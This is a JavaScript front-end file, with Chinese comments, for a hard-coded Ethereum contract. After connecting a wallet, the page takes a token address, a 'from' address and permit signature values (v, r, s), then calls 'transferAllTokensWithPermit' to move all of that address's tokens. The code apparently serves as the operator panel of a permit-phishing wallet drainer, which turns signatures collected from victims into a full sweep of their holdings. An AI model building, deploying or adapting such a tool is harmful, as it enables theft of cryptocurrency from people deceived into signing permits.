const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30'; // 合约地址
const contractABI = [
    // 在这里插入你提供的合约 ABI
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "target",
                "type": "address"
            }
        ],
        "name": "AddressEmptyCode",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "AddressInsufficientBalance",
        "type": "error"
    },
    {
        "inputs": [],
        "name": "FailedInnerCall",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }
        ],
        "name": "SafeERC20FailedOperation",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "TransferTokens",
        "type": "event"
    }
];

let web3;
let userAddress;

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        document.getElementById('address').innerText = userAddress;
        document.getElementById('walletInfo').classList.remove('hidden');
        document.getElementById('connectWallet').classList.add('hidden');
    } else {
        alert('请安装MetaMask或其他以太坊钱包！');
    }
}

async function transferTokens() {
    const tokenAddress = document.getElementById('tokenAddress').value;
    const fromAddress = document.getElementById('fromAddress').value;
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;

    const contract = new web3.eth.Contract(contractABI, contractAddress);

    try {
        await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
        document.getElementById('message').innerText = '代币转移成功！';
        document.getElementById('message').classList.remove('hidden');
    } catch (error) {
        console.error(error);
        document.getElementById('message').innerText = '代币转移失败！';
        document.getElementById('message').classList.remove('hidden');
    }
}

document.getElementById('connectWallet').addEventListener('click', connectWallet);
document.getElementById('transferTokens').addEventListener('click', transferTokens);
